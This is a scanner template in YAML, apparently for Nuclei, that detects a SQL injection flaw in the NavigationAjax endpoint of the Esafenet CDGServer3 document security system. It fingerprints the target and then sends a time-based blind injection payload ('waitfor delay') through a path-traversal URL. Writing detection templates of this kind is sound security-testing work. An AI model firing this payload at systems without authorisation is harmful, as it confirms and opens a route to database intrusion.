id: poc-yaml-yisaitong-esafenet-navigationajax-sqli
info:
  name: 亿赛通电子文档安全管理系统 NavigationAjax SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection

variables:
  t1: "{{rand_int(5,10)}}"
  t2: "{{to_number(t1) + 2}}"

http:
  - method: GET
    path:
      - "{{BaseURL}}/"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "CDGServer3"

  - method: POST
    path:
      - "{{BaseURL}}/CDGServer3/js/../NavigationAjax"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: "command=nav&id=-999'waitfor delay '0:0:{{t1}}'--+&name=&openId="
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - ""
      - type: dsl
        dsl:
          - "duration > to_number(t1) && duration < to_number(t2)"
